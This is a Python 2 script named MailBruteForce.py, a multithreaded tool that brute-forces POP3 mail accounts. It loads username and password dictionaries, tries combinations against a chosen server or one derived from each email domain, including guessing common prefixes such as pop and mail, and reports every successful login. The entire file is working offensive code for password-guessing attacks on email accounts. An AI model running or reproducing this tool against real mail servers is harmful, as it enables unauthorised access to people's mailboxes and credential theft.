#!usr/bin/env python                                        #
#-*- coding: utf-8 -*-                                      #
#-----------------------------------------------------------#
#MailBruteForce.py version 0.12                             #
#Author: linglingqi  (2016.07.23)                           #
#-------Modules---------------------------------------------#
from __future__ import division
import threadpool
import time
import poplib
import sys
import optparse
#-------Variables-------------------------------------------#
user_list=[]
pass_list=[]
userpass_list=[] 
payload_num=0
completed_num=0
success_results=[]
error_server_users=[]
user_file_path=""
pass_file_path=""
domain_intruded=""
port_intruded=""
threads_num=0
delay_time=0
userpass_check_type=False   
auto_extract_domain=False

#--------Functions------------------------------------------#
def PrintResult(request, result):
    print '-'*80
    print result
    
def CheckServer(domain,port):
    #Check the sever connection
    try:
        if port==995:
            pop_chk=poplib.POP3_SSL(domain,port)
        else:
            pop_chk=poplib.POP3(domain,port)
        pop_chk.quit()
        return True
    except Exception,e:
        return False

def DictionaryProcess():
    try:
        global payload_num
        user_file=open(user_file_path,'r')
        for user_line in user_file.readlines():
            if len(user_line.strip())>1:
                user_list.append(user_line)
        pass_file=open(pass_file_path,'r')
        for pass_line in pass_file.readlines():
            if len(pass_line.strip())>1:
                pass_list.append(pass_line)
        
        #if try to all user/pass combination        
        if userpass_check_type:
            for username in user_list:
                for password in pass_list:
                    info="%s:%s"%(username.strip(),password.strip())
                    userpass_list.append(info)
                    payload_num+=1
        else:
            for i in range(min(len(user_list),len(pass_list))):
                info="%s:%s"%(user_list[i].strip(),pass_list[i].strip())
                userpass_list.append(info)
                payload_num+=1
        user_file.close()
        pass_file.close()
        
    except Exception,e:
        print "[-] Error: %s\n"%(e)

def CheckExtractDomain(original_info):
    #add prefix to domain and check server when auto extract domain 
    #original_info[0] is server ,original_info[1] is port ,original_info[2] is a boolean which is used to check server
    check_extract_info=[original_info[0],original_info[1],original_info[2]]
    try:
        if CheckServer(original_info[0],original_info[1]):
            check_extract_info[2]=True
        else:
            if original_info[0].lower()=="hotmail.com":
                check_extract_info[0]="pop3.live.com"
                check_extract_info[1]=995
                if CheckServer(original_info[0],original_info[1]):
                    check_extract_info[2]=True
            else:
                #add prefix to domain and check it
                for domain_prefix in domain_prefix_list:
                    if original_info[0].count(".")<=2:
                        check_extract_info[0]=domain_prefix+"."+original_info[0]
                    elif original_info[0].count(".")==3:
                        check_extract_info[0]=domain_prefix+"."+original_info[0][original_info[0].index('.')+1:]
                    check_extract_info[1]=110
                    if CheckServer(check_extract_info[0],check_extract_info[1]):
                        check_extract_info[2]=True
                        break
                    else:
                        check_extract_info[1]=995
                        if CheckServer(check_extract_info[0],check_extract_info[1]):
                            check_extract_info[2]=True
                            break
    except Exception,e:
        check_extract_info[2]=False
    finally:
        return check_extract_info
        
def LoginServer(login_server,login_port,login_user,login_pass):
    #login the server and return the login status
    login_server_return=[False,False,'']
    is_auth_user=False
    try:
        if login_port==995:
            pop_login=poplib.POP3_SSL(login_server,login_port)
        else:
            pop_login=poplib.POP3(login_server,login_port)
        user_auth=pop_login.user(login_user)
        if "+OK" in user_auth.upper():
            login_server_return[0]=True
            is_auth_user=True
        pass_auth=pop_login.pass_(login_pass)
        if  "+OK" in pass_auth.upper():
            login_server_return[1]=True
            login_server_return[2]="[-]Login is successful!"
        pop_login.quit()
    except Exception,e:
        if not is_auth_user:
            login_server_return[2]="Login user is not correct"
        else:
            login_server_return[2]=e
    finally:
        return login_server_return

def MailBruteForce(login_info):
    feeback_info=""
    try:
        global completed_num
        login_user=login_info.split(":")[0].strip()
        login_pass=login_info.split(":")[1].strip()
        server_checked=domain_intruded
        port_checked=port_intruded
        
        #extract the domain from username
        if auto_extract_domain and login_user.find("@")>0:
            extract_info=[login_user.split("@")[1].strip(),port_checked,False]
            #check the server information
            result_check_extract_info=CheckExtractDomain(extract_info)
            server_checked=result_check_extract_info[0]
            port_checked=result_check_extract_info[1]
            #check the server is error
            if not result_check_extract_info[2]:
                error_server_users.append(login_user)
                raise Exception("Server is error")
        login_results=LoginServer(server_checked,port_checked,login_user,login_pass)    
        if login_results[0]==False:
            #try to login user removed @suffix when login server is error 
            if login_user.find("@")>0:
                login_results=LoginServer(server_checked,port_checked,login_user.split("@")[0].strip(),login_pass)
        elif login_results[1]:
            success_results.append(login_info)
        completed_num+=1
        feeback_info="[+] User: %s, Pass: %s, Server: %s:%s, %s, Completed: %.2f%%, Success: %s"%(login_user,login_pass,server_checked,port_checked,login_results[2],completed_num/payload_num*100,len(success_results))
    except Exception,e:
        completed_num+=1
        feeback_info="[+] User: %s, Pass: %s, Server: %s:%s, %s, Completed: %.2f%%, Success: %s"%(login_user,login_pass,server_checked,port_checked,e,completed_num/payload_num*100,len(success_results))
    finally:
        #delaying time,reduce error to connect sever
        time.sleep(delay_time)
        #return the login results
        return feeback_info
    
if __name__=='__main__':
    USAGE_MSG="%prog [Options]..." 
    parser=optparse.OptionParser(USAGE_MSG)
    parser.add_option("-U",action="store",type="string",dest="users_dict",default="default_user",help="Dictionary of username")
    parser.add_option("-P",action="store",type="string",dest="passwords_dict",default="default_pass",help="Dictionary of password")
    parser.add_option("-s",action="store",type="string",dest="server",default="",help="Server intruded. Example: pop.qiye.163.com")
    parser.add_option("-p",action="store",type="int",dest="server_port",default=110,help="Port of sever intruded, default=110")
    parser.add_option("-t",action="store",type="int",dest="threads_setup",default=10,help="Number of running thread, default=10")
    parser.add_option("-d",action="store",type="float",dest="delay_setup",default=0.5,help="Thread delay time, default=0.5")
    parser.add_option("-E",action="store_true",dest="extract_domain",help="Automatically extract domain from username contained '@'")
    try:
        if len(sys.argv)==1:
            (options,args)=parser.parse_args(["-h"])
        else:
            (options,args)=parser.parse_args()
            auto_extract_domain=options.extract_domain
            user_file_path=options.users_dict
            pass_file_path=options.passwords_dict
            domain_intruded=options.server
            port_intruded=options.server_port
            threads_num=options.threads_setup
            delay_time=options.delay_setup
    except Exception,e:
        print "[+] Error %s"%(e)
        (options,args)=parser.parse_args(["-h"])
    else:
        #if go to check
        if not auto_extract_domain:
            if not CheckServer(domain_intruded,port_intruded):
                print "[+] Error: Server don't connect."
                sys.exit()
        else:
            domain_prefix_list=["pop","pop3","mail","webmail"]
        
        #begin checking
        user_input=raw_input("Do you check all of the users and passwords combination?[y/n]: ")
        if user_input=="y" or user_input=="Y":
            userpass_check_type=True
        else:
            userpass_check_type=False
        
        #process user and pass, generate a new userpass_list
        DictionaryProcess() 
        #print main information checked
        print "\n[+] Thread num: %s"%(threads_num)
        print "[+] Server: %s"%(domain_intruded)
        print "[+] Users loaded: %s"%(len(user_list))
        print "[+] Passwords loaded: %s"%(len(pass_list))
        print "[+] Payload num: %s\n"%(payload_num)
        print "Starting to check, please wait..."
        #creat threadpool
        pool=threadpool.ThreadPool(threads_num)
        requests=threadpool.makeRequests(MailBruteForce,userpass_list,PrintResult)
        [pool.putRequest(req) for req in requests]
        pool.wait()
        pool.dismissWorkers(threads_num, do_join=True)#To use dismissWorkers,prevent mistakes
    finally:
        #print the result
        print "\n"
        print "-"*80
        print "[-] Done.\n"
        if len(error_server_users)>0:
            print "[-]  Error server User:"
            for error_server_user in list(set(error_server_users)):
                print "%s"%(error_server_user)
            print "\n"  
        if len(success_results)>0:
            print "[-] Successful login:"
            for success_result in success_results:
                print "%s"%(success_result)